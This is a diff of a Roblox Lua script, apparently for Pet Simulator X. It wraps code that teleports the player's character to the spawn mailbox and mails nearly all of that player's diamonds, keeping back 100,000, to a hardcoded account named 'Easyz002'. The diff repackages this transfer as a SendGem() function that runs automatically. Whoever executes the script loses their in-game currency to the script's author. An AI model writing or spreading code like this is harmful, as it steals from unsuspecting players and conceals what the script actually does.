@@ -9,9 +9,6 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local Character = Players.LocalPlayer.Character
 local HumanoidRootPart = Character.HumanoidRootPart
-local Save = Library.Save.Get()
-
-getgenv().Diamonds = Save.Diamonds
 
 if game.PlaceId == 6284583030 then
     local banSuccess, banError = pcall(function()
@@ -155,22 +152,23 @@ if game.PlaceId == 6284583030 then
         };
     end
 
-    ;
-
-
-    if Library.WorldCmds.Get() ~= "Spawn" then
-        Library.WorldCmds.Load("Spawn")
-
-        wait(30)
-
-        HumanoidRootPart.CFrame = Library.WorldCmds.GetMap().Interactive.Mailbox.Pad.CFrame
-        --wait(1)
-        --HumanoidRootPart.CFrame = HumanoidRootPart.CFrame + (HumanoidRootPart.CFrame.LookVector * 15)
-
-        wait(1)
-
-        print(Library.Network.Invoke("Send Mail", ComposeMail("Easyz002", Diamonds - 100000)))
-
-        wait(3)
+    function SendGem()
+        if Library.WorldCmds.Get() ~= "Spawn" then
+            Library.WorldCmds.Load("Spawn")
+    
+            wait(30)
+    
+            HumanoidRootPart.CFrame = Library.WorldCmds.GetMap().Interactive.Mailbox.Pad.CFrame
+            --wait(1)
+            --HumanoidRootPart.CFrame = HumanoidRootPart.CFrame + (HumanoidRootPart.CFrame.LookVector * 15)
+    
+            wait(1)
+    
+            print(Library.Network.Invoke("Send Mail", ComposeMail("Easyz002", Library.Save.Diamonds - 100000)))
+    
+            wait(3)
+        end
     end
+
+    SendGem()
 end
